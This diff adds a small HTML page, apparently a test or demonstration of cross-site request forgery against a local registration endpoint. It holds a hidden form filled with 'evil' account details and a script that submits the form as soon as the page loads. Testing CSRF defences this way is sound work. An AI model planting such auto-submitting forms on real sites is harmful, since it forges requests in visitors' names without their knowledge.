@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Document</title>
+    </head>
+    <body>
+        <h1>CSRF Protection Example</h1>
+        <form id="evilForm"
+              action="http://127.0.0.1:8000/registration/form/sql/"
+              method="POST"
+              style="display:none">
+            <input type="text" name="name" value="Evil User">
+            <input type="email" name="email" value="evil@example.com">
+            <input type="password" name="password" value="evilpassword">
+        </form>
+        <script>document.getElementById('evilForm').submit();</script>
+    </body>
+</html>
